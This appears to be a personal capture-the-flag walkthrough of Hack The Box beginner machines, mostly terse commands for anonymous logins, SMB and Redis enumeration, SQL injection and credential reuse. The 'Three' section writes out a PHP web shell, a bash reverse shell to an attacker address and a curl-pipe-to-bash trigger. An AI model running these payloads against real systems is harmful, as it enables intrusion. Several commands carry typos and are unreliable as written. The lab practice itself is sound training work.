# TIER 0

### Meow  
telnet as "root", blank password

### Fawn
ftp as anonymous, get flag.txt  

### Dancing  
smbclient -L {IP-address}  
smbclient \\\\{IP-address}\\WorkShares  
ls; cd ..; cd James.P; get flag.txt  

### Redeemer  
redis-cli -h {IP-address}
info  
keys *  
get Flag  

### Explosion
RDP as Administrator, no password  
xfreerdp /v:Administrator /cert:ignore /v:{IP-addess}  

### Preignition
gobuster -x php {IP-address}
http://{IP-address}/admini.php

# TIER 1
### Appoinment
SQLI on login page-> admin'#  

### Sequel
mysql -h {IP-address} -u root
SHOW databases;
USE htb; SHOW tables; SELECT * FROM config;

### Crocodile
ftp anonymous to get list of usernames/passwords
gobustoer -x php to find login.php
admin user goes to server page showing flag  

### Responder  
sudo get install evil-winrm  
evit-winrm -u Administrator -p badminton -i {IP-address}  

### Three  
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt  
gobuster vhost -w ./subdomains-top1million5000.txt -u http://thetoppers.htb  
yields "s3".thetopppers.htb
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb  
echo '<?php system($_GET["cmd"]); ?>' > shell.php  
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb  
http://thetoppers.htb/shell.php?cmd=id  
create shell.sh  
#!/bin/bash
bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1

nc -nvlp 1337
python3 -m http.server 8000  
http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash  

### Ignition
http://ignition.htb/admin
admin:qwerty123

### Bike
### Pennyworth


